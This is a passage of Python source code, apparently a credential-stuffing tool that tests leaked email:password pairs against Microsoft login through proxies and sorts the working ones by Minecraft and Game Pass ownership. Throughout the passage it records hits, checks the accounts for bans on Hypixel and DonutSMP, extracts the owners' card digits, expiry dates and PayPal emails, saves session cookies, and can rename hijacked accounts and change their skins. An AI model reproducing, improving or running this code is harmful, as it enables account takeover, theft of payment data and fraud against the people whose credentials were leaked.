                                print(Fore.YELLOW + f"⚠️  Name change parsing error: {str(e)[:50]}" + Style.RESET_ALL)
                    
                    elif check.status_code == 429:
                        # Rate limited - wait and retry
                        if len(proxylist) < 5: 
                            time.sleep(3)
                        tries += 1
                        continue
                    
                    elif check.status_code == 401:
                        # Unauthorized - token might be invalid
                        if screen == "'2'": 
                            print(Fore.RED + f"❌ Name change check unauthorized (invalid token)" + Style.RESET_ALL)
                        self.namechanged = "Unknown"
                        break
                    
                    else:
                        # Other error status
                        if screen == "'2'": 
                            print(Fore.YELLOW + f"⚠️  Name change API returned {check.status_code}" + Style.RESET_ALL)
                        tries += 1
                        continue
                        
                except requests.exceptions.Timeout:
                    if screen == "'2'": 
                        print(Fore.YELLOW + f"⚠️  Name change check timeout" + Style.RESET_ALL)
                    tries += 1
                except Exception as e:
                    if screen == "'2'": 
                        print(Fore.RED + f"❌ Name change check error: {str(e)[:50]}" + Style.RESET_ALL)
                    tries += 1
                
                # Increment retry counter
                if tries < maxretries:
                    retries += 1
            
            # If all retries failed and namechanged is still None, set to Unknown
            if self.namechanged is None:
                self.namechanged = "Unknown"
    
    def ban(self, session):
        global errors
        if config.get('hypixelban'):
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            while tries < maxretries:
                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    data = json.loads(str(packet.json_data))
                    if "Suspicious activity" in str(data):
                        self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Banned')
                    elif "temporarily banned" in str(data):
                        self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Banned')
                    elif "You are permanently banned from this server!" in str(data):
                        self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Banned')
                    elif "The Hypixel Alpha server is currently closed!" in str(data):
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                    elif "Failed cloning your SkyBlock data" in str(data):
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned')
                    else:
                        self.banned = ''.join(item["text"] for item in data["extra"])
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Banned')
                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    if self.banned == None:
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        self.save_cookies('Unbanned', session)
                try:
                    # Set a short default socket timeout to avoid hanging on bad proxies
                    original_timeout = socket.getdefaulttimeout()
                    socket.setdefaulttimeout(8)
                    if len(banproxies) > 0:
                        proxy = random.choice(banproxies)
                        if '@' in proxy:
                            atsplit = proxy.split('@')
                            socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
                        else:
                            ip_port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                        socket.socket = socks.socksocket
                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    try:
                        connection.connect()
                        # Wait briefly for a disconnect or join packet to set banned status
                        c = 0
                        while self.banned == None and c < 600:  # ~6s
                            time.sleep(0.01)
                            c += 1
                        try:
                            connection.disconnect()
                        except:
                            pass
                    except Exception:
                        # Rotate proxy on failures
                        pass
                    sys.stderr = original_stderr
                    # Restore default timeout
                    socket.setdefaulttimeout(original_timeout)
                except: pass
                if self.banned != None: break
                tries+=1
            
            # Final fallback - if all retries failed and still None
            if self.banned == None:
                self.banned = "Unable to check - All retries failed"
                if screen == "'2'": 
                    print(Fore.RED + f"❌ Hypixel ban check failed after {maxretries} attempts" + Style.RESET_ALL)

    def donut_check(self):
        global donut_banned, donut_unbanned
        if config.get('donutcheck') is True:
            result = None
            disconnect_message = None
            chat_messages = []
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            try:
                connection = Connection("donutsmp.net", 25565, auth_token=auth_token, initial_version=393, allowed_versions={393})

                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    nonlocal result, disconnect_message
                    try:
                        msg = str(packet.json_data)
                    except Exception:
                        msg = ""
                    disconnect_message = msg
                    result = "banned"

                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    nonlocal result
                    result = "unbanned"
                
                # Listen for chat messages to extract stats
                @connection.listener(clientbound.play.ChatMessagePacket)
                def chat_message(packet):
                    nonlocal chat_messages
                    try:
                        msg = str(packet.json_data)
                        chat_messages.append(msg)
                    except Exception:
                        pass

                connection.connect()
                c = 0
                # Wait for connection result
                while result is None and c < 1000:
                    time.sleep(0.01)
                    c += 1
                
                # After joining, wait for welcome/automatic messages from server
                if result == "unbanned":
                    if screen == "'2'": print(Fore.CYAN + f"[DEBUG] Joined DonutSMP, waiting for server messages..." + Style.RESET_ALL)
                    
                    # Method 1: Wait longer for automatic stats (many servers send stats on join)
                    # Most servers send welcome messages, MOTD, and sometimes stats automatically
                    time.sleep(5)  # Wait 5 seconds for server to send messages
                    
                    # Method 2: Check for stats API or website
                    # Many servers have stats websites like stats.donutsmp.net
                    try:
                        # Try common stat website patterns
                        stat_urls = [
                            f"https://stats.donutsmp.net/player/{self.name}",
                            f"https://donutsmp.net/stats/{self.name}",
                            f"https://api.donutsmp.net/stats/{self.name}",
                            f"https://www.donutsmp.net/player/{self.name}"
                        ]
                        
                        for url in stat_urls:
                            try:
                                stat_response = requests.get(url, timeout=3, verify=False)
                                if stat_response.status_code == 200 and len(stat_response.text) > 100:
                                    if screen == "'2'": print(Fore.GREEN + f"[DEBUG] Found stats website: {url}" + Style.RESET_ALL)
                                    # Parse stats from website
                                    stat_text = stat_response.text
                                    
                                    # Extract common stats patterns
                                    money_match = re.search(r'(?:money|balance|coins?)\D*([\d,]+)', stat_text, re.IGNORECASE)
                                    if money_match:
                                        self.donut_money = f"${money_match.group(1)}"
                                    
                                    playtime_match = re.search(r'(?:playtime|time played)\D*([\d]+\s*(?:hours?|days?|minutes?)(?:\s*[\d]+\s*(?:hours?|minutes?))?)', stat_text, re.IGNORECASE)
                                    if playtime_match:
                                        self.donut_playtime = playtime_match.group(1)
                                    
                                    kills_match = re.search(r'kills?\D*([\d,]+)', stat_text, re.IGNORECASE)
                                    if kills_match:
                                        self.donut_kills = kills_match.group(1)
                                    
                                    deaths_match = re.search(r'deaths?\D*([\d,]+)', stat_text, re.IGNORECASE)
                                    if deaths_match:
                                        self.donut_deaths = deaths_match.group(1)
                                    
                                    break
                            except:
                                continue
                    except Exception as e:
                        if screen == "'2'": print(Fore.YELLOW + f"[DEBUG] No stats website found" + Style.RESET_ALL)

                if result == "unbanned":
                    self.donut_status = "unbanned"
                    donut_unbanned += 1
                    
                    # Debug: Show received messages
                    if screen == "'2'":
                        print(Fore.CYAN + f"[DEBUG] Received {len(chat_messages)} chat messages from DonutSMP" + Style.RESET_ALL)
                        if chat_messages:
                            print(Fore.CYAN + f"[DEBUG] First 3 messages: {chat_messages[:3]}" + Style.RESET_ALL)
                    
                    # Extract DonutSMP stats from chat messages
                    all_messages = ' '.join(chat_messages)
                    clean = re.sub(r'§.', '', all_messages)
                    
                    if screen == "'2'" and clean:
                        print(Fore.CYAN + f"[DEBUG] Cleaned text preview: {clean[:200]}" + Style.RESET_ALL)
                    
                    # Money extraction
                    money_match = re.search(r'(?:Money|Balance|Coins?):\s*\$?([0-9,]+)', clean, re.IGNORECASE)
                    self.donut_money = f"${money_match.group(1)}" if money_match else None
                    
                    # Playtime extraction (multiple formats)
                    playtime_match = re.search(r'(?:Playtime|Time Played|Play Time):\s*([^\n\\,]+)', clean, re.IGNORECASE)
                    self.donut_playtime = playtime_match.group(1).strip() if playtime_match else None
                    
                    # Shards extraction
                    shards_match = re.search(r'(?:Donut )?Shards?:\s*([0-9,]+)', clean, re.IGNORECASE)
                    self.donut_shards = shards_match.group(1) if shards_match else None
                    
                    # Additional DonutSMP stats
                    level_match = re.search(r'Level:\s*([0-9,]+)', clean, re.IGNORECASE)
                    self.donut_level = level_match.group(1) if level_match else None
                    
                    rank_match = re.search(r'Rank:\s*([^\n\\,]+)', clean, re.IGNORECASE)
                    self.donut_rank = rank_match.group(1).strip() if rank_match else None
                    
                    kills_match = re.search(r'Kills?:\s*([0-9,]+)', clean, re.IGNORECASE)
                    self.donut_kills = kills_match.group(1) if kills_match else None
                    
                    deaths_match = re.search(r'Deaths?:\s*([0-9,]+)', clean, re.IGNORECASE)
                    self.donut_deaths = deaths_match.group(1) if deaths_match else None
                    
                    with open(f"results/{fname}/DonutUnbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                elif result == "banned":
                    self.donut_status = "banned"
                    donut_banned += 1
                    if disconnect_message:
                        # Debug: Print raw message if in log mode
                        if screen == "'2'":
                            print(Fore.CYAN + f"\n[DEBUG] DonutSMP Disconnect Message:\n{disconnect_message[:500]}" + Style.RESET_ALL)
                        
                        clean = re.sub(r'§.', '', disconnect_message)
                        
                        # Extract all text parts from JSON
                        text_parts = re.findall(r'"text"\s*:\s*"([^"]+)"', disconnect_message)
                        if text_parts:
                            full_text = ' '.join(text_parts)
                            if screen == "'2'":
                                print(Fore.CYAN + f"[DEBUG] Extracted text: {full_text[:200]}" + Style.RESET_ALL)
                            
                            # Clean and combine all text
                            clean_full = full_text.replace('\\n', '\n').replace('\\r', '')
                            # Remove Minecraft color codes
                            clean_full = re.sub(r'[§&$][0-9a-fk-or]', '', clean_full, flags=re.IGNORECASE)
                            # Remove Discord links
                            clean_full = re.sub(r'(?:https?://)?(?:www\.)?discord\.gg/\S+', '', clean_full, flags=re.IGNORECASE)
                            
                            # Extract ban reason - look for text in brackets or before "Date:"
                            reason_match = re.search(r'\[([^\]]+)\]', clean_full)
                            if reason_match:
                                self.donut_reason = reason_match.group(1).strip()
                            else:
                                # Try to find ban reason (text containing "banned" or substantial text)
                                ban_texts = [t.strip() for t in text_parts if len(t.strip()) > 10 and 'banned' in t.lower()]
                                if ban_texts:
                                    reason = ban_texts[0]
                                    reason = reason.replace('\\n', ' ').replace('\\r', ' ').replace('\n', ' ').replace('\r', ' ')
                                    reason = re.sub(r'[§&$][0-9a-fk-or]', '', reason, flags=re.IGNORECASE)
                                    reason = re.sub(r'\s+', ' ', reason).strip()
                                    # Remove Discord links more aggressively
                                    reason = re.sub(r'discord\.gg/\S*', '', reason, flags=re.IGNORECASE)
                                    reason = re.sub(r'(?:https?://)?(?:www\.)?discord\.[a-z]+/\S*', '', reason, flags=re.IGNORECASE)
                                    reason = re.split(r'(?:Time Left|Ban ID|Date|Expires)', reason, flags=re.IGNORECASE)[0].strip()
                                    self.donut_reason = reason[:150] if reason else "Banned"
                                else:
                                    # Use first substantial text as fallback
                                    substantial = [t.strip() for t in text_parts if len(t.strip()) > 10 and 'discord' not in t.lower()]
                                    if substantial:
                                        reason = substantial[0].replace('\\n', ' ').replace('\\r', ' ').replace('\n', ' ').replace('\r', ' ')
                                        # Remove Minecraft color codes
                                        reason = re.sub(r'[§&$][0-9a-fk-or]', '', reason, flags=re.IGNORECASE)
                                        # Remove Discord links
                                        reason = re.sub(r'discord\.gg/\S*', '', reason, flags=re.IGNORECASE)
                                        reason = re.sub(r'(?:https?://)?(?:www\.)?\S+\.(?:com|net|org|gg)/\S+', '', reason, flags=re.IGNORECASE)
                                        self.donut_reason = re.sub(r'\s+', ' ', reason).strip()[:150]
                                    else:
                                        self.donut_reason = "Banned"
                        else:
                            self.donut_reason = "Banned"
                        
                        # Extract date if available
                        date_match = re.search(r'Date:\s*([0-9/]+)', disconnect_message, re.IGNORECASE)
                        if date_match:
                            self.donut_time = f"Banned on {date_match.group(1)}"
                        else:
                            # Extract time left with better pattern
                            time_match = re.search(r'Time Left:\s*([^\\]+?)(?:Ban ID|$)', disconnect_message, re.IGNORECASE)
                            if time_match:
                                time_str = time_match.group(1).strip()
                                time_str = time_str.replace('\\n', '').replace('\\r', '').replace('\n', '').replace('\r', '')
                                time_str = re.sub(r'[\\\[\]{}"\']', '', time_str).strip()
                                self.donut_time = time_str if time_str else ""
                            else:
                                # Try to find time-like patterns
                                time_pattern = re.search(r'(\d+\s*(?:day|hour|minute|week|month|year)s?(?:\s+\d+\s*(?:day|hour|minute|week|month|year)s?)*|permanent|forever)', disconnect_message, re.IGNORECASE)
                                self.donut_time = time_pattern.group(1) if time_pattern else ""
                        
                        # Extract ban ID - look for # followed by alphanumeric
                        banid_match = re.search(r'(?:Ban ID|ID)\s*:\s*[§&$]?[0-9a-fk-or]?(#?[A-Za-z0-9]+)', disconnect_message, re.IGNORECASE)
                        self.donut_banid = banid_match.group(1).strip() if banid_match else ""
                    else:
                        self.donut_reason = "Banned (no details provided)"
                    with open(f"results/{fname}/DonutBanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")

                    # Attempt to fetch public stats even when banned
                    try:
                        stat_urls = [
                            f"https://stats.donutsmp.net/player/{self.name}",
                            f"https://donutsmp.net/stats/{self.name}",
                            f"https://api.donutsmp.net/stats/{self.name}",
                            f"https://www.donutsmp.net/player/{self.name}"
                        ]
                        for url in stat_urls:
                            try:
                                stat_response = requests.get(url, timeout=3, verify=False)
                                if stat_response.status_code == 200 and len(stat_response.text) > 100:
                                    if screen == "'2'": print(Fore.GREEN + f"[DEBUG] (Banned) Found stats website: {url}" + Style.RESET_ALL)
                                    stat_text = stat_response.text
                                    money_match = re.search(r'(?:money|balance|coins?)\D*([\d,]+)', stat_text, re.IGNORECASE)
                                    if money_match: self.donut_money = f"${money_match.group(1)}"
                                    playtime_match = re.search(r'(?:playtime|time played)\D*([\d]+\s*(?:hours?|days?|minutes?)(?:\s*[\d]+\s*(?:hours?|minutes?))?)', stat_text, re.IGNORECASE)
                                    if playtime_match: self.donut_playtime = playtime_match.group(1)
                                    kills_match = re.search(r'kills?\D*([\d,]+)', stat_text, re.IGNORECASE)
                                    if kills_match: self.donut_kills = kills_match.group(1)
                                    deaths_match = re.search(r'deaths?\D*([\d,]+)', stat_text, re.IGNORECASE)
                                    if deaths_match: self.donut_deaths = deaths_match.group(1)
                                    break
                            except:
                                continue
                    except Exception:
                        pass
                connection.disconnect()
            except Exception as e:
                pass

    def payment_check(self):
        # Payment check is now disabled by default for better CPM - can enable in config.ini
        if config.get('payment') is True and self.session:
            try:
                # Get Microsoft payment instruments
                headers = {
                    'Authorization': f'Bearer {self.token}',
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                
                r = self.session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers)
                
                if r.status_code == 200:
                    def lr_parse(source, start_delim, end_delim):
                        pattern = re.escape(start_delim) + r'(.*?)' + re.escape(end_delim)
                        match = re.search(pattern, source)
                        return match.group(1) if match else None
                    
                    # Extract payment information
                    payment_info = []
                    
                    # Credit card info
                    credit_card = lr_parse(r.text, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
                    if credit_card:
                        last4 = lr_parse(r.text, 'lastFourDigits":"', '"')
                        expiry_month = lr_parse(r.text, 'expiryMonth":"', '"')
                        expiry_year = lr_parse(r.text, 'expiryYear":"', '"')
                        payment_info.append(f"CC: {credit_card} ****{last4 or 'XXXX'} {expiry_month or 'XX'}/{expiry_year or 'XX'}")
                    
                    # PayPal info
                    paypal_email = lr_parse(r.text, 'email":"', '"')
                    if paypal_email:
                        payment_info.append(f"PayPal: {paypal_email}")
                    
                    # Balance info
                    balance = lr_parse(r.text, 'balance":', ',')
                    if balance:
                        payment_info.append(f"Balance: ${balance}")
                    
                    if payment_info:
                        self.payment = " | ".join(payment_info)
                        with open(f"results/{fname}/Payment.txt", 'a') as f:
                            f.write(f"{self.email}:{self.password} | {self.payment}\n")
                    
            except Exception as e:
                pass

    def save_cookies(self, account_type):
        if config.get('cookies') is True and self.session:
            try:
                # Create cookies directory
                cookies_dir = os.path.join(f'results/{fname}', 'Cookies', account_type)
                if not os.path.exists(cookies_dir):
                    os.makedirs(cookies_dir)
                
                # Save cookies to file
                cookie_file = os.path.join(cookies_dir, f'{self.name}.txt')
                jar = MozillaCookieJar(cookie_file)
                
                for cookie in self.session.cookies:
                    jar.set_cookie(cookie)
                
                jar.save(ignore_discard=True)
                
                # Clean up the file (remove header comments)
                with open(cookie_file, 'r') as file:
                    lines = file.readlines()
                
                # Remove first 3 lines (Netscape cookie file header)
                lines = lines[3:]
                while lines and lines[0].strip() == '':
                    lines.pop(0)
                
                with open(cookie_file, 'w') as file:
                    file.writelines(lines)
                    
            except Exception as e:
                pass

    def setname(self):
        """Auto username changing  """
        if config.get('setname') is True:
            # Store original name before changing
            self.original_name = self.name
            newname = ''.join(random.choices(string.ascii_lowercase + string.digits, k=3)) + "_" + config.get('customname') + "_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=3))
            tries = 0
            while tries < maxretries:
                try:
                    name_change = self.session.put('https://api.minecraftservices.com/minecraft/profile/name/' + newname, headers={'Authorization': f'Bearer {self.token}'})
                    if name_change.status_code == 200:
                        print(Fore.GREEN + f"✅ Name changed: {self.name} → {newname}" + Style.RESET_ALL)
                        self.name = newname
                        break
                    elif name_change.status_code == 403:
                        print(Fore.YELLOW + f"⚠️  Name change unavailable: {self.name}" + Style.RESET_ALL)
                        break
                    else:
                        time.sleep(3)
                except: pass
                tries += 1

    def setskin(self):
        """Auto skin changing  """
        if config.get('setskin') is True:
            tries = 0
            while tries < maxretries:
                try:
                    skin_data = {
                        "variant": config.get('skinvariant'),
                        "url": config.get('skinurl')
                    }
                    skin_change = self.session.post('https://api.minecraftservices.com/minecraft/profile/skins', json=skin_data, headers={'Authorization': f'Bearer {self.token}'})
                    if skin_change.status_code == 200:
                        print(Fore.GREEN + f"✅ Skin changed: {self.name}" + Style.RESET_ALL)
                        break
                    else:
                        time.sleep(3)
                except: pass
                tries += 1

    def handle(self):
        global hits
        hits+=1
        if screen == "'2'": print(Fore.CYAN + Style.BRIGHT + f"🔥 HIT: {self.name} | {self.email}:{self.password}" + Style.RESET_ALL)
        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{self.email}:{self.password}\n")
        if self.name != 'N/A':
            try: Capture.hypixel(self)
            except: pass
            try: Capture.optifine(self)
            except: pass
            try: Capture.full_access(self)
            except: pass
            try: Capture.namechange(self)
            except: pass
            try: Capture.check_changeability(self)
            except: pass
            try: Capture.check_account_age(self)
            except: pass
            try: Capture.save_changeability(self)
            except: pass
            try: Capture.ban(self)
            except: pass
            try: Capture.donut_check(self)
            except: pass
            try: Capture.payment_check(self)
            except: pass
            try: Capture.save_cookies(self, self.type)
            except: pass
            # Profile customization
            if config.get('setname'): 
                try: Capture.setname(self)
                except: pass
        else: 
            # Set name even for N/A accounts if enabled
            if config.get('setname'):
                try: Capture.setname(self)
                except: pass
        
        # Set skin for all accounts if enabled
        if config.get('setskin'):
            try: Capture.setskin(self)
            except: pass
            
        open(f"results/{fname}/Capture.txt", 'a').write(Capture.builder(self))
        Capture.notify(self)

class Login:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        
def get_urlPost_sFTTag(session):
    global retries
    # Use dynamic token extraction   and Flarecloud
    max_retries = 3  # Limit retries to prevent infinite loops
    retry_count = 0
    while retry_count < max_retries:
        try:
            text = session.get(sFTTag_url, timeout=15).text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sFTTag, session
        except Exception:
            pass
        session.proxy = getproxy()
        retries += 1
        retry_count += 1
    
    # If all retries failed, return None
    return None, None, session

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, checked
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<="ipt" value=").+?(?=">)', login_request.text).group(),
                    'pprid': re.search('(?<="pprid" value=").+?(?=">)', login_request.text).group(),
                    'uaid': re.search('(?<="uaid" value=").+?(?=">)', login_request.text).group()
                }
                ret = session.post(re.search('(?<=id="fmHF" action=").+?(?=" )', login_request.text).group(), data=data, allow_redirects=True)
                fin = session.get(re.search('(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text).group(), allow_redirects=True)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                # Try to continue authentication for 2FA accounts - they can still be valid
                try:
                    if 'ret' in locals() and ret.text:
                        fin = session.get(re.search('(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text).group(), allow_redirects=True)
                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                        if token != "None":
                            return token, session
                except:
                    pass
                
                # If we can't continue authentication, mark as 2FA
                twofa+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.MAGENTA + f"🔐 2FA: {email}:{password}" + Style.RESET_ALL)
                with open(f"results/{fname}/2fa.txt", 'a') as file:
                    file.write(f"{email}:{password}\n")
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                bad+=1
                checked+=1
                cpm+=1
                # More detailed BAD reason logging
                if "password is incorrect" in login_request.text.lower():
                    reason = "Wrong Password"
                elif "account doesn't exist" in login_request.text.lower():
                    reason = "Account Not Found"
                elif "sign in to your microsoft account" in login_request.text.lower():
                    reason = "Login Required"
                elif "tried to sign in too many times" in login_request.text.lower():
                    reason = "Rate Limited"
                else:
                    reason = "Auth Failed"
                
                if screen == "'2'": print(Fore.RED + f"❌ BAD ({reason}): {email}:{password}" + Style.RESET_ALL)
                return "None", session
            else:
                session.proxy = getproxy()
                retries+=1
                tries+=1
        except:
            session.proxy = getproxy()
            retries+=1
            tries+=1
    bad+=1
    checked+=1
    cpm+=1
    if screen == "'2'": print(Fore.RED + f"❌ BAD: {email}:{password}" + Style.RESET_ALL)
    return "None", session

def mc_token(session, uhs, xsts_token):
    global retries
    tries = 0
    while tries < maxretries:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxy = getproxy()
                if len(proxylist) < 1: time.sleep(5)  # Reduce delay from 20 to 5 seconds
                tries+=1
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries+=1
            session.proxy = getproxy()
            tries+=1
    return None

def capture_mc(access_token, session, email, password, type, xbox_token=None):
    global retries
    tries = 0
    while tries < maxretries:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False)
            if r.status_code == 200:
                capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type, xbox_token)
                CAPTURE.session = session
                CAPTURE.handle()
                break
            elif r.status_code == 429:
                retries+=1
                session.proxy = getproxy()
                if len(proxylist) < 5: time.sleep(3)  # Reduce from 20 to 3 seconds
                tries+=1
                continue
            else: break
        except:
            retries+=1
            session.proxy = getproxy()
            tries+=1

def checkownership(entitlements_response):
    """Enhanced account type detection  """
    items = entitlements_response.get("items", [])
    has_normal_minecraft = False
    has_game_pass_pc = False
    has_game_pass_ultimate = False
    
    for item in items:
        name = item.get("name", "")
        source = item.get("source", "")
        if name in ("game_minecraft", "product_minecraft") and source in ("PURCHASE", "MC_PURCHASE"):
            has_normal_minecraft = True
        if name == "product_game_pass_pc":
            has_game_pass_pc = True
        if name == "product_game_pass_ultimate":
            has_game_pass_ultimate = True
    
    # Enhanced detection logic
    if has_normal_minecraft and has_game_pass_pc:
        return "Normal Minecraft (with Game Pass)"
    elif has_normal_minecraft and has_game_pass_ultimate:
        return "Normal Minecraft (with Game Pass Ultimate)"
    elif has_normal_minecraft:
        return "Normal Minecraft"
    elif has_game_pass_ultimate:
        return "Xbox Game Pass Ultimate"
    elif has_game_pass_pc:
        return "Xbox Game Pass (PC)"
    else:
        return "Unknown Account Type"

def checkmc(session, email, password, token, xbox_token=None):
    global retries, bedrock, cpm, checked, xgp, xgpu, other
    tries = 0
    while tries < maxretries:
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False)
            if checkrq.status_code == 429:
                retries+=1
                session.proxy = getproxy()
                if len(proxylist) < 1: time.sleep(3)
                tries+=1
                continue
            elif checkrq.status_code != 200:
                return False
            # If status is 200, break and process
            break
        except:
            retries+=1
            session.proxy = getproxy()
            tries+=1
    
    # Check if we exhausted retries
    if tries >= maxretries:
        return False
    
    # Use enhanced account type detection
    try:
        acctype = checkownership(checkrq.json())
        if screen == "'2'": print(Fore.GREEN + Style.BRIGHT + f"🎮 {acctype}: {email}:{password}" + Style.RESET_ALL)
        
        if acctype == "Xbox Game Pass Ultimate" or acctype == "Normal Minecraft (with Game Pass Ultimate)":
            xgpu+=1
            cpm+=1
            checked+=1
            with open(f"results/{fname}/XboxGamePassUltimate.txt", 'a') as f: f.write(f"{email}:{password}\n")
            try: capture_mc(token, session, email, password, acctype, xbox_token)
            except: 
                CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", f"{acctype} [Unset MC]", xbox_token)
                CAPTURE.session = session
                CAPTURE.handle()
            return True
        elif acctype == "Xbox Game Pass (PC)" or acctype == "Normal Minecraft (with Game Pass)":
            xgp+=1
            cpm+=1
            checked+=1
            if screen == "'2'": print(Fore.GREEN + Style.BRIGHT + f"🎮 Xbox Game Pass: {email}:{password}" + Style.RESET_ALL)
            with open(f"results/{fname}/XboxGamePass.txt", 'a') as f: f.write(f"{email}:{password}\n")
            capture_mc(token, session, email, password, acctype, xbox_token)
            return True
        elif acctype == "Normal Minecraft":
            checked+=1
            cpm+=1
            capture_mc(token, session, email, password, "Normal", xbox_token)
            return True
        else:
            others = []
            if 'product_minecraft_bedrock' in checkrq.text:
                others.append("Minecraft Bedrock")
            if 'product_legends' in checkrq.text:
                others.append("Minecraft Legends")
            if 'product_dungeons' in checkrq.text:
                others.append('Minecraft Dungeons')
            if others != []:
                other+=1
                cpm+=1
                checked+=1
                items = ', '.join(others)
                open(f"results/{fname}/Other.txt", 'a').write(f"{email}:{password} | {items}\n")
                if screen == "'2'": print(Fore.YELLOW + f"🎲 Other: {email}:{password} | {items}" + Style.RESET_ALL)
                # Process other accounts as hits too
                try: 
                    capture_mc(token, session, email, password, f"Other ({items})", xbox_token)
                except: 
                    CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", f"Other ({items}) [Unset MC]", xbox_token)
                    CAPTURE.session = session
                    CAPTURE.handle()
                return True
            else:
                return False
    except:
        return False

def authenticate(email, password, tries = 0):
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = getproxy()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        # Check if get_urlPost_sFTTag failed
        if urlPost is None or sFTTag is None:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED + f"❌ BAD (Connection Failed): {email}:{password}" + Style.RESET_ALL)
            return
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token != None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
